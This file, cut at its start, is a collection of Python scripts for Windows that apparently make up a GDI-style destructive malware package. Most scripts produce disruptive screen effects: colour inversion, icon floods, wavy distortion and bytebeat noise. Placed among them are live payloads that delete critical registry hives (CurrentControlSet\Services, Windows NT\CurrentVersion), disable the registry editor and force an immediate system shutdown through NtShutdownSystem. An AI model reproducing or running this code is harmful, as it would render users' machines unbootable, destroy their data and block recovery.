    x = windll.user32.GetSystemMetrics(0)
    y = windll.user32.GetSystemMetrics(1)
    w = windll.user32.GetSystemMetrics(0)
    h = windll.user32.GetSystemMetrics(1)
    windll.gdi32.BitBlt(hdc, 5, 5, w, h, hdc, 12, 12, 0x00CC0020)
    time.sleep(0.01)
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT) # Makes a lot of stuff :)
    Sleep(10) # Waits 10 milliseconds
ReleaseDC(desk, GetDesktopWindow()) # Releases memory.
DeleteDC(desk) # Deletes our DC.

import ctypes
import random
import time

# Constants and necessary functions declaration
SRCCOPY = 0x00CC0020
PATINVERT = 0x005A0049

user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32

def get_dc(hwnd):
    return user32.GetDC(hwnd)

def release_dc(hwnd, hdc):
    return user32.ReleaseDC(hwnd, hdc)

def create_solid_brush(color):
    return gdi32.CreateSolidBrush(color)

def select_object(hdc, hgdiobj):
    return gdi32.SelectObject(hdc, hgdiobj)

def bitblt(hdc, x, y, cx, cy, hdc_src, x1, y1, rop):
    return gdi32.BitBlt(hdc, x, y, cx, cy, hdc_src, x1, y1, rop)

def get_system_metrics(n_index):
    return user32.GetSystemMetrics(n_index)

def set_process_dpi_aware():
    return user32.SetProcessDPIAware()

if __name__ == "__main__":
    set_process_dpi_aware()
    sw = get_system_metrics(0)
    sh = get_system_metrics(1)

    start_time = time.time()
    duration = 40  

    while time.time() - start_time < duration:
        hdc = get_dc(0)
        color = (random.randint(0, 122) << 16) | (random.randint(0, 430) << 8) | random.randint(0, 310)
        brush = create_solid_brush(color)
        select_object(hdc, brush)
        bitblt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, SRCCOPY)
        bitblt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, PATINVERT)
        release_dc(0, hdc)
        time.sleep(0.1)  # Pause for 0.1 seconds to reduce CPU usage
import subprocess

subprocess.run(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "/f"])
subprocess.run(["reg", "delete", "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "/f"])
subprocess.run(["reg", "delete", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "/f"])



import ctypes
import random
import time

user32 = ctypes.windll.user32

SM_CXSCREEN = 0
SM_CYSCREEN = 1
IDI_ERROR = 32513
IDI_QUESTION = 32514
IDI_WARNING = 32515
IDI_APPLICATION = 32512

def get_desktop_window():
    return user32.GetDesktopWindow()

def get_window_dc(hwnd):
    return user32.GetWindowDC(hwnd)

def get_system_metrics(index):
    return user32.GetSystemMetrics(index)

def draw_icon(hdc, x, y, hicon):
    return user32.DrawIcon(hdc, x, y, hicon)

def load_icon(hinstance, lpiconname):
    return user32.LoadIconW(hinstance, lpiconname)

def main():
    hDc = get_window_dc(get_desktop_window())
    rand = random.Random()

    start_time = time.time()
    duration = 30  # seconds

    while time.time() - start_time < duration:
        x = rand.randint(0, get_system_metrics(SM_CXSCREEN))
        y = rand.randint(0, get_system_metrics(SM_CYSCREEN))
        draw_icon(hDc, x, y, load_icon(None, IDI_ERROR))

        x = rand.randint(0, get_system_metrics(SM_CXSCREEN))
        y = rand.randint(0, get_system_metrics(SM_CYSCREEN))
        draw_icon(hDc, x, y, load_icon(None, IDI_QUESTION))

        x = rand.randint(0, get_system_metrics(SM_CXSCREEN))
        y = rand.randint(0, get_system_metrics(SM_CYSCREEN))
        draw_icon(hDc, x, y, load_icon(None, IDI_WARNING))

        x = rand.randint(0, get_system_metrics(SM_CXSCREEN))
        y = rand.randint(0, get_system_metrics(SM_CYSCREEN))
        draw_icon(hDc, x, y, load_icon(None, IDI_APPLICATION))

        time.sleep(0)

if __name__ == "__main__":
    main()
import win32api
import win32con
import win32gui
import math
import time
import random

def wavy_screen():
    desktop = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(desktop)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)

    # Create a bitmap to hold the wavy screen
    hBitmap = win32gui.CreateCompatibleBitmap(hdc, sw, sh)
    memDC = win32gui.CreateCompatibleDC(hdc)
    win32gui.SelectObject(memDC, hBitmap)

    for y in range(sh):
        for x in range(sw):
            # Calculate the displacement of the sine wave for each pixel
            displacement = int(math.sin(x / 10) * 50 + math.cos(y / 10) * 50)
            # Calculate RGB values based on position in the sine wave
            r = int(127 * (1 + math.sin((x + displacement) / 10)) + 128)
            g = int(127 * (1 + math.sin((y + displacement) / 10)) + 128)
            b = int(127 * (1 - math.sin(((x + y) + displacement) / 20)) + 128)
            # Draw the wavy pixel
            win32gui.SetPixel(memDC, x, y, win32api.RGB(r, g, b))

    # Copy the wavy screen bitmap to the desktop
    win32gui.BitBlt(hdc, 0, 0, sw, sh, memDC, 0, 0, win32con.SRCCOPY)

    # Clean up
    win32gui.DeleteObject(hBitmap)
    win32gui.DeleteDC(memDC)
    win32gui.ReleaseDC(desktop, hdc)

def wavy_screen2():
    desktop = win32gui.GetDesktopWindow()
    hdc = win32gui.GetWindowDC(desktop)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)

    # Create a bitmap to hold the wavy screen
    hBitmap = win32gui.CreateCompatibleBitmap(hdc, sw, sh)
    memDC = win32gui.CreateCompatibleDC(hdc)
    win32gui.SelectObject(memDC, hBitmap)

    for y in range(sh):
        for x in range(sw):
            # Calculate the displacement of the sine wave for each pixel
            displacement = int(math.sin(x / 10) * 50 + math.cos(y / 10) * 50)
            # Calculate RGB values based on position in the sine wave
            r = int(127 * (1 + math.sin(x / 10)) + 128)
            g = int(127 * (1 + math.sin(y / 10)) + 128)
            b = int(127 * (1 - math.sin((x + y) / 20)) + 128)
            # Draw the wavy pixel
            win32gui.SetPixel(memDC, x, y, win32api.RGB(r, g, b))

    # Copy the wavy screen bitmap to the desktop
    win32gui.BitBlt(hdc, 0, 0, sw, sh, memDC, 0, 0, win32con.SRCCOPY)

    # Clean up
    win32gui.DeleteObject(hBitmap)
    win32gui.DeleteDC(memDC)
    win32gui.ReleaseDC(desktop, hdc)

if __name__ == '__main__':
    start_time = time.time()
    duration = 20  # seconds

    while time.time() - start_time < duration:
        wavy_screen()
        time.sleep(2)
        wavy_screen2()
import win32api
import win32gui
import random
import win32con
from win32gui import * #type: ignore
from win32gui import GetDesktopWindow, GetWindowDC, StretchBlt, BitBlt
from win32api import GetSystemMetrics
from math import * #type: ignore
import time

hwnd = GetDesktopWindow()
hdc2 = GetWindowDC(hwnd)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
x2 = GetSystemMetrics(0)

import math
desktop = GetDesktopWindow()
left, top, right,bottom = GetWindowRect(desktop)

def redraw():
    RedrawWindow(0, None, None, win32con.RDW_ERASE | win32con.RDW_INVALIDATE | win32con.RDW_ALLCHILDREN) #type: ignore

start_time = time.time()
duration = 20  # seconds

while time.time() - start_time < duration:
    hdc = GetDC(0)
    memdc = CreateCompatibleDC(hdc)
    hbit = CreateCompatibleBitmap(hdc, x, y)
    sel = SelectObject(memdc, hbit) #type: ignore

    val = random.randint(1, 2)
    rateofturning = 30
    if val == 1:
        PlgBlt(memdc, ((left-rateofturning,top+rateofturning) , (right-rateofturning,top-rateofturning) , (left+rateofturning,bottom+rateofturning)) , hdc, 0, 0, x2, y, 0, 0, 0);

    if val == 2:
        PlgBlt(memdc, ((left-rateofturning, top+rateofturning), (right-rateofturning, top-rateofturning), (left+rateofturning, bottom+rateofturning)), hdc, 0, 0, x2, y, 0, 0, 0);

    AlphaBlend(hdc,random.randint(-30,-30), random.randint(-30, -30), x, y, memdc, 0, 0, x, y, (0, 0, 90, 0))

    SelectObject(memdc, sel) #type: ignore
    DeleteObject(sel)
    DeleteObject(hbit)
    DeleteDC(memdc)
    DeleteDC(hdc)

from win32api import *
from win32con import *
from win32gui import *
import math
from time import time, sleep

def calculate_position(t, initial_pos, initial_velocity, gravity):
    """
    Calculate the position of the "ball" at time t using projectile motion equations.
    """
    x0, y0 = initial_pos
    vx0, vy0 = initial_velocity
    x = x0 + vx0 * t
    y = y0 + vy0 * t - 0.5 * gravity * t**2
    return int(x), int(y)

def main():
    w, h = GetSystemMetrics(0), GetSystemMetrics(1)  # Screen width and height

    # Initial position and velocity
    initial_pos = (50, 50)
    initial_velocity = (20, -20)  # Initial horizontal and vertical velocities
    gravity = 9.8  # Acceleration due to gravity (m/s^2)

    start_time = time()
    duration = 30  # seconds

    try:
        t = 0  # Initial time
        while time() - start_time < duration:
            hdc = GetDC(0)  # Get device context for the screen
            x, y = calculate_position(t, initial_pos, initial_velocity, gravity)
            if y < 0:  # If ball hits the top edge, reverse the vertical velocity
                initial_velocity = (initial_velocity[0], -initial_velocity[1])
                t = 0  # Reset time
            BitBlt(hdc, x, y, w, h, hdc, 0, 0, SRCCOPY)
            ReleaseDC(0, hdc)

            t += 0.2  # Increment time
            sleep(0.05)  # Small delay to control the speed of the animation

    except KeyboardInterrupt:
        pass

main()
from win32api import *
from win32con import *
from win32gui import *
import time

def main():
    start_time = time.time()
    duration = 1 * 60  
    
    while time.time() - start_time < duration:
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 20, SRCCOPY)
        ReleaseDC(0, hdc)

main()
import win32api
import win32con
import win32gui
import random
import time

def main():
    start_time = time.time()
    duration = 1 * 60  
    
    while time.time() - start_time < duration:
        hdc = win32gui.GetDC(0)
        w = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        h = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        rx = random.randint(0, w)
        win32gui.BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, hdc)

if __name__ == "__main__":
    main()
import winreg

key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(key)

from win32api import *
from win32gui import *
import win32con
import time
import random

hwnd = GetDesktopWindow()
hdc2 = GetWindowDC(hwnd)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
x2 = GetSystemMetrics(0)
import math
import time
desktop = GetDesktopWindow()
left, top, right, bottom = GetWindowRect(desktop)

def redraw():
    RedrawWindow(0, None, None, win32con.RDW_ERASE | win32con.RDW_INVALIDATE | win32con.RDW_ALLCHILDREN)

def zoom_vertical():
    hdc = GetDC(0)
    for i in range(15):
        SetStretchBltMode(hdc, 4)
        StretchBlt(hdc, 0, 0 - 10, x2 + 20, y, hdc, 0, 0, x2, y, win32con.SRCINVERT)
        StretchBlt(hdc, 0, 0 - 10, x2 + 20, y, hdc, 0, 0, x2, y, win32con.SRCCOPY)
    ReleaseDC(0, hdc)

def zoom_horizontal():
    hdc = GetDC(0)
    for i in range(15):
        SetStretchBltMode(hdc, 4)
        StretchBlt(hdc, 0 - 10, 0, x2, y + 20, hdc, 0, 0, x2, y, win32con.SRCINVERT)
        StretchBlt(hdc, 0 - 10, 0, x2, y + 20, hdc, 0, 0, x2, y, win32con.SRCCOPY)
    ReleaseDC(0, hdc)

start_time = time.time()
duration = 30  

while time.time() - start_time < duration:
    zoom_vertical()
    redraw()
    zoom_horizontal()
    redraw()
import ctypes
import random
import time

user32 = ctypes.WinDLL('user32')
gdi32 = ctypes.WinDLL('gdi32')

GetSystemMetrics = user32.GetSystemMetrics
GetDC = user32.GetDC
ReleaseDC = user32.ReleaseDC
CreateSolidBrush = gdi32.CreateSolidBrush
BitBlt = gdi32.BitBlt
DeleteObject = gdi32.DeleteObject
SelectObject = gdi32.SelectObject

SM_CXSCREEN = 0
SM_CYSCREEN = 1

def main():
    w = GetSystemMetrics(SM_CXSCREEN)
    h = GetSystemMetrics(SM_CYSCREEN)
    start_time = time.time()
    duration = 30  

    while time.time() - start_time < duration:
        hdc = GetDC(0)
        for i in range(10):
            x = random.randint(0, w)
            y = random.randint(0, h)
            brush = CreateSolidBrush((random.randint(0, 255) << 16) | (random.randint(0, 255) << 8) | random.randint(0, 255))
            SelectObject(hdc, brush)
            BitBlt(hdc, x, y, 30, 30, hdc, x - 30, y - 30, 0x00C000CA)
            DeleteObject(brush)
        ReleaseDC(0, hdc)

if __name__ == "__main__":
    main()

import ctypes
import time
import math
import numpy as np
import pyaudio

# Constants
BLACKNESS = 0x00000042
PS_SOLID = 0
RGB = lambda r, g, b: (r | (g << 8) | (b << 16))

# Win32 API functions
gdi32 = ctypes.windll.gdi32
user32 = ctypes.windll.user32

# Structure definitions
class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

# CreatePen function
def CreatePen(style, width, color):
    return gdi32.CreatePen(style, width, color)

# SelectObject function
def SelectObject(hdc, obj):
    return gdi32.SelectObject(hdc, obj)

# MoveToEx function
def MoveToEx(hdc, x, y, pt):
    return gdi32.MoveToEx(hdc, x, y, ctypes.byref(pt))

# LineTo function
def LineTo(hdc, x, y):
    return gdi32.LineTo(hdc, x, y)

# PatBlt function
def PatBlt(hdc, x, y, width, height, rop):
    return gdi32.PatBlt(hdc, x, y, width, height, rop)

# CreateSolidBrush function
def CreateSolidBrush(color):
    return gdi32.CreateSolidBrush(color)

# Ellipse function
def Ellipse(hdc, left, top, right, bottom):
    return gdi32.Ellipse(hdc, left, top, right, bottom)

# GetDesktopWindow function
def GetDesktopWindow():
    return user32.GetDesktopWindow()

# GetWindowDC function
def GetWindowDC(hwnd):
    return user32.GetWindowDC(hwnd)

# ReleaseDC function
def ReleaseDC(hwnd, hdc):
    return user32.ReleaseDC(hwnd, hdc)

def draw_rotating_cube(hdc, angle):
    yellow_pen = CreatePen(PS_SOLID, 3, RGB(255, 255, 0))
    green_pen = CreatePen(PS_SOLID, 3, RGB(0, 255, 0))

    cube_points = [
        (-50, -50, -50), (50, -50, -50), (50, 50, -50), (-50, 50, -50),
        (-50, -50, 50), (50, -50, 50), (50, 50, 50), (-50, 50, 50)
    ]

    rotated_points = []
    for x, y, z in cube_points:
        new_x = x * math.cos(angle) - z * math.sin(angle)
        new_y = y
        new_z = x * math.sin(angle) + z * math.cos(angle)
        rotated_points.append((new_x, new_y, new_z))

    screen_points = []
    for x, y, z in rotated_points:
        factor = 400 / (400 + z)
        screen_x = int(600 + x * factor)
        screen_y = int(300 - y * factor)
        screen_points.append((screen_x, screen_y))

    edges = [
        (0, 1), (1, 2), (2, 3), (3, 0), (4, 5), (5, 6), (6, 7), (7, 4),
        (0, 4), (1, 5), (2, 6), (3, 7)
    ]

    pt = POINT()
    for i, j in edges:
        pen = yellow_pen if i < 4 else green_pen
        SelectObject(hdc, pen)
        MoveToEx(hdc, screen_points[i][0], screen_points[i][1], pt)
        LineTo(hdc, screen_points[j][0], screen_points[j][1])

def draw_spiral(hdc, angle):
    centerX, centerY = 800, 300
    radius = 5
    increment = 5
    circles = 20
    brush = CreateSolidBrush(RGB(255, 165, 0))

    for i in range(circles):
        x = centerX + int(radius * math.cos(angle + i * 0.5))
        y = centerY + int(radius * math.sin(angle + i * 0.5))
        SelectObject(hdc, brush)
        Ellipse(hdc, x - 10, y - 10, x + 10, y + 10)
        radius += increment

def bytebeat(t):
    return (t * t >> 9) | (t >> 5) | (t >> 98) | (t >> 898)

# Initialize PyAudio
p = pyaudio.PyAudio()

def callback(in_data, frame_count, time_info, status):
    t = callback.t
    data = np.array([bytebeat(t + i) for i in range(frame_count)], dtype=np.uint8).tobytes()
    callback.t += frame_count
    return (data, pyaudio.paContinue)

callback.t = 0

stream = p.open(format=pyaudio.paUInt8,
                channels=1,
                rate=8000,
                output=True,
                stream_callback=callback)

desktop_hwnd = GetDesktopWindow()
hdc = GetWindowDC(desktop_hwnd)

start_time = time.time()

try:
    angle = 0
    stream.start_stream()
    
    while time.time() - start_time < 15:
        PatBlt(hdc, 0, 0, 1920, 1080, BLACKNESS)
        draw_rotating_cube(hdc, angle)
        draw_spiral(hdc, angle)
        angle += 0.1
        time.sleep(0.05)
finally:
    stream.stop_stream()
    stream.close()
    p.terminate()
    ReleaseDC(desktop_hwnd, hdc)
    
import ctypes
import random
import time
SM_CXSCREEN = 0
SM_CYSCREEN = 1
PATINVERT = 0x005A0049
SRCCOPY = 0x00CC0020
SRCINVERT = 0x00660046
SRCPAINT = 0x00EE0086


user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32


GetDC = user32.GetDC
ReleaseDC = user32.ReleaseDC
PatBlt = gdi32.PatBlt
CreateSolidBrush = gdi32.CreateSolidBrush
SelectObject = gdi32.SelectObject
DeleteObject = gdi32.DeleteObject
Sleep = kernel32.Sleep
LineTo = gdi32.LineTo
RoundRect = gdi32.RoundRect
StretchBlt = gdi32.StretchBlt


sw = user32.GetSystemMetrics(SM_CXSCREEN)
sh = user32.GetSystemMetrics(SM_CYSCREEN)


rand = random.Random()

def main():
    hdc = GetDC(0)
    start_time = time.time()

    while time.time() - start_time < 10:  
        time.sleep(0.0001)  

        if rand.randint(0, 2) == 2:
            color = random_color()
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            PatBlt(hdc, 0, 0, sw, sh, PATINVERT)
            DeleteObject(brush)
        elif rand.randint(0, 2) == 1:
            color = random_color()
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            PatBlt(hdc, 0, 0, sw, sh, PATINVERT)
            DeleteObject(brush)

        if rand.randint(0, 25) == 9:
            color = random_color()
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            DeleteObject(brush)
        elif rand.randint(0, 25) == 5:
            color = random_color()
            brush = CreateSolidBrush(color)
            SelectObject(hdc, brush)
            DeleteObject(brush)

        if rand.randint(0, 1) == 1:
            LineTo(hdc, rand.randint(0, sw), rand.randint(0, sh))
            RoundRect(hdc, rand.randint(0, sw), rand.randint(0, sh), rand.randint(0, sw), rand.randint(0, sh), rand.randint(0, sw), rand.randint(0, sh))

        if rand.randint(0, 1) == 1:
            LineTo(hdc, rand.randint(0, sw), rand.randint(0, sh))
            RoundRect(hdc, rand.randint(0, sw), rand.randint(0, sh), rand.randint(0, sw), rand.randint(0, sh), rand.randint(0, sw), rand.randint(0, sh))
        elif rand.randint(0, 1) == 0:
            hdc2 = GetDC(0)
            r1 = rand.randint(0, sw)
            r2 = rand.randint(0, sh)
            color = random_color()
            hbrush = CreateSolidBrush(color)
            StretchBlt(hdc2, 0, 0, sw, r1, hdc2, r1, r2, 1, 1, PATINVERT)
            DeleteObject(hbrush)

        if rand.randint(0, 7) == 5:
            StretchBlt(hdc, rand.randint(0, sw), rand.randint(0, sh), sw, sh, hdc, 0, 0, sw, sh, SRCCOPY)
            StretchBlt(hdc, 10, 10, sw - 20, sh - 20, hdc, 0, 0, sw, sh, SRCPAINT)
            StretchBlt(hdc, -10, -10, sw + 20, sh + 20, hdc, 0, 0, sw, sh, SRCPAINT)
            StretchBlt(hdc, 0, 0, sw, sh, hdc, rand.randint(0, sw), rand.randint(0, sh), sw, sh, SRCINVERT)
            
    

def random_color():
    r = rand.randint(0, 255)
    g = rand.randint(0, 255)
    b = rand.randint(0, 255)
    return (r << 16) | (g << 8) | b

if __name__ == "__main__":
    main()


from win32api import *
from win32gui import *
from win32con import *
from random import randint as rand
import time

def main():
    dc = GetDC(0)
    start_time = time.time()
    while time.time() - start_time < 20:
        w, h = GetSystemMetrics(0), GetSystemMetrics(1)
        BitBlt(dc, rand(0, 2), rand(0, 2), w, h, dc, rand(0, 2), rand(0, 2), SRCAND)
        Sleep(250)

    ReleaseDC(0, dc)

main()

import win32gui
import win32con
import ctypes
import math
import time

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)
dx = dy = 1
angle = 0
size = 1
speed = 5
start_time = time.time()

while time.time() - start_time < 5:
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
    dx = math.ceil(math.sin(angle) * size * 10)
    dy = math.ceil(math.cos(angle) * size * 10)
    angle += speed / 10
    if angle > math.pi:
        angle = math.pi * -1

win32gui.ReleaseDC(0, hdc)


import ctypes

class Shutdown:
    def __init__(self):
        self.ntdll = ctypes.WinDLL(
            'ntdll.dll',
            use_last_error=True
        )

        self.RtlAdjustPrivilege = self.ntdll.RtlAdjustPrivilege
        self.RtlAdjustPrivilege.argtypes = [
            ctypes.c_ulong,
            ctypes.c_long,
            ctypes.c_long,
            ctypes.POINTER(
                ctypes.c_long
            )
        ]
        self.RtlAdjustPrivilege.restype = ctypes.c_long

    def set_privilege(self):
        if self.RtlAdjustPrivilege(
            19, # Privilege (SE_SHUTDOWN_PRIVILEGE)
            True, # Enable Privilege
            False, # Current Thread
            ctypes.byref(
                ctypes.c_long(0)
            ) # Byref Previous Value As UInt
        ):
            return False

        else:
            return True

    def shutdown_system(self):
        if self.set_privilege():
            return self.ntdll.NtShutdownSystem(
                False # ShutdownNoReboot Action
            )

if __name__ == '__main__':
    shutdown = Shutdown()
    shutdown.shutdown_system()
